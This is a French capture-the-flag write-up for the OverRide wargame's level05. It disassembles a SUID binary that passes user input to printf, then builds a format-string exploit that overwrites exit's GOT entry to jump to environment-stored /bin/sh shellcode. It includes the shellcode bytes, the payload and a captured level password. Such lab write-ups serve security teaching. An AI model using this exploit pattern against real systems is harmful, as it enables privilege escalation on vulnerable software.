## 1: Analyse

### A: C'est quoi mon binaire?
  * Bon vous commencez a comprendre mon workflow maintenant. Regardez les exercices precedents si vous comprenez pas.
  ```shell
  level04@OverRide:/tmp$ su level05
    Password: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05

  level05@OverRide:~$ ls -la
    total 17
    dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
    dr-x--x--x  1 root    root     260 Oct  2  2016 ..
    -rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
    lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
    -rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
    -rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
    -rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
    -rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile

  level05@OverRide:~$ ./level05
    coucou
    coucou

  level05@OverRide:~$ ./level05
    qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuioasdfghjklzxcvbnmqwertyuioasdfghjkzxcvbnm
    qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuioasdfghjklzxclevel05@OverRide:~$
  ```

  * On a un binaire appartenant a level05 dans le home avec les droits SUID...
  * ... qui demande un input et le print ...
  * ... qui segfault pas avec un input trop long

### B: On l'ouvre avec gdb
  * Pareil pour ici regardez les exos precedents si vous comprenez pas ce que je fais

  ```shell
  level05@OverRide:~$ cd /tmp

  level05@OverRide:/tmp$ gdb ~/level05
    GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
    Copyright (C) 2012 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
    and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    For bug reporting instructions, please see:
    <http://bugs.launchpad.net/gdb-linaro/>...
    Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.

  gdb-peda$ info function
    All defined functions:

    Non-debugging symbols:
    0x080482f8  _init
    0x08048340  printf
    0x08048340  printf@plt
    0x08048350  fgets
    0x08048350  fgets@plt
    0x08048360  __gmon_start__
    0x08048360  __gmon_start__@plt
    0x08048370  exit
    0x08048370  exit@plt
    0x08048380  __libc_start_main
    0x08048380  __libc_start_main@plt
    0x08048390  _start
    0x080483c0  __do_global_dtors_aux
    0x08048420  frame_dummy
    0x08048444  main
    0x08048520  __libc_csu_init
    0x08048590  __libc_csu_fini
    0x08048592  __i686.get_pc_thunk.bx
    0x080485a0  __do_global_ctors_aux
    0x080485cc  _fini

  gdb-peda$ pdisas main
    Dump of assembler code for function main:
    # Init, save registers, align, allocate 144
    0x08048444 <+0>:	push   ebp
    0x08048445 <+1>:	mov    ebp,esp
    0x08048447 <+3>:	push   edi
    0x08048448 <+4>:	push   ebx
    0x08048449 <+5>:	and    esp,0xfffffff0
    0x0804844c <+8>:	sub    esp,0x90

    # i = 0
    0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0

    # fgets(buffer[100], 100, stdin)
    0x0804845d <+25>:	mov    eax,ds:0x80497f0
    0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
    0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
    0x0804846e <+42>:	lea    eax,[esp+0x28]
    0x08048472 <+46>:	mov    DWORD PTR [esp],eax
    0x08048475 <+49>:	call   0x8048350 <fgets@plt>

    # i = 0
    0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0

    # while i < strlen(buffer)
    0x08048485 <+65>:	jmp    0x80484d3 <main+143>

    # ... if *(buffer + i) > 64: ...
    0x08048487 <+67>:	lea    eax,[esp+0x28]
    0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
    0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
    0x08048495 <+81>:	cmp    al,0x40
    0x08048497 <+83>:	jle    0x80484cb <main+135>

    # ... ... if buffer[i] <= 90
    0x08048499 <+85>:	lea    eax,[esp+0x28]
    0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
    0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
    0x080484a7 <+99>:	cmp    al,0x5a
    0x080484a9 <+101>:	jg     0x80484cb <main+135>

    # ... ... buffer[i] = buffer[i] ^ 32
    0x080484ab <+103>:	lea    eax,[esp+0x28]
    0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
    0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
    0x080484b9 <+117>:	mov    edx,eax
    0x080484bb <+119>:	xor    edx,0x20
    0x080484be <+122>:	lea    eax,[esp+0x28]
    0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
    0x080484c9 <+133>:	mov    BYTE PTR [eax],dl

    # ... i++
    0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1

    # Condition du while: i < strlen(buffer)
    0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
    0x080484da <+150>:	lea    eax,[esp+0x28]
    0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
    0x080484e6 <+162>:	mov    edx,eax
    0x080484e8 <+164>:	mov    eax,0x0
    0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
    0x080484f1 <+173>:	mov    edi,edx
    0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
    0x080484f5 <+177>:	mov    eax,ecx
    0x080484f7 <+179>:	not    eax
    0x080484f9 <+181>:	sub    eax,0x1
    0x080484fc <+184>:	cmp    ebx,eax
    0x080484fe <+186>:	jb     0x8048487 <main+67>

    # printf(buffer)
    0x08048500 <+188>:	lea    eax,[esp+0x28]
    0x08048504 <+192>:	mov    DWORD PTR [esp],eax
    0x08048507 <+195>:	call   0x8048340 <printf@plt>

    # exit(0)
    0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
    0x08048513 <+207>:	call   0x8048370 <exit@plt>
    End of assembler dump.
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessus
  ```shell
    gdb-peda$ x/s 0x80497f0
      0x80497f0 <stdin@@GLIBC_2.0>:	 ""
  ```

## 2: Comportement

* Ok, donc on a un main qui demande un input, et fait un strlower (fais un xor 32 sur tous les caractères dont la valeur ascii est entre 64 -A- et 90 -Z-)
* Ensuite, il printf l'input saus aucune sécurité.

## 3: Exploit

### A: Explication

> On va donc profiter de la faille de la format string.\
> On ne peut pas lancer un shellcode dans notre buffer puisqu'il est altéré par le programme.\
> On va donc choisir de réécrire sur la GOT de exit().\
> Le souci, c'est que son addresse est trop grande pour tenir dans un seul int.\
> Or, %n écrit un int et on le casse si on essaye d'écrire trop de caractères.\
> On va donc le "couper en 2" et écrire 2 small_int sur chaqune des moitiés de la GOT d'exit.

### B: Creation de l'exploit

* Il nous faut donc: le GOT d'exit, le GOT d'exit + 2, un shellcode dans l'env, son addresse et enfin: l'offset!

```shell
  # On choppe l'addresse de la GOT de exit
  level05@OverRide:/tmp$ objdump -R ~/level05
    [...]
    080497e0 R_386_JUMP_SLOT   exit
    [...]
  # GOT exit      = 080497e0
  # GOT exit + 2  = 080497e2
  
  # On crée un shellcode avec peda
    gdb-peda$ shellcode generate x86/linux exec
    # x86/linux/exec: 24 bytes
    shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )

  # On l'export dans l'env a la fin d'une grosse NOPSLED
  level05@OverRide:/tmp$ export SHELL_CODE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')

  # On trouve son addresse
  gdb-peda$ b * main
    Breakpoint 1 at 0x8048444
  gdb-peda$ r
    [...]
  gdb-peda$ x/150s *((char **) environ)
    [...]
    0xffffdb29:	 "SHELL_CODE=\220\220\220..."
    [...]
  # On a donc le debut de la NOPSLED. Prenons 0xffffdb29 + 500 = 0xffffdd1d

  # Et maintenant l'offset
  gdb-peda$ run
    FFFF %p %p %p %p %p %p %p %p %p %p 10 %p %p %p %p %p %p %p %p %p %p 20                  v-- start_buffer
    ffff 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd27f 0xffffd27e (nil) 0xffffffff 0xffffd304 (nil) 0x66666666 10 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x31207025 0x70252030 0x20702520 20
  # ... est de 10!
```

* On a donc tous les prérequis.
* Notre exploit se présente donc de la manière suivante:
- GOT exit                  => \xe0\x97\x04\x08 => le premier %n va écrire à cette addresse
- GOT exit + 2              => \xe2\x97\x04\x08 => le deuxieme %n va écrire à cette addresse
- padding (0xdd1d = 56105)  => %56605d          => le premier %n va écrire 56613
- premier %n                => %10$hn
- padding (0xffff = 65535)  => %8922d           => le deuxieme %n va écrire 8922 + 56613 = 65535
- deuxieme %n               => %11$hn

```shell
  level05@RainFall:/tmp$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56605d" + "%10$hn" + "%8922d" "%11$hn"' > pattern05

  level05@RainFall:/tmp$ cat pattern05 - | ~/level05
    [...]
  whoami
    level06
  cat /home/users/level06/.pass
    h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
  level05@OverRide:/tmp$ su level06
    Password: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level06/level06
  level06@OverRide:~$
```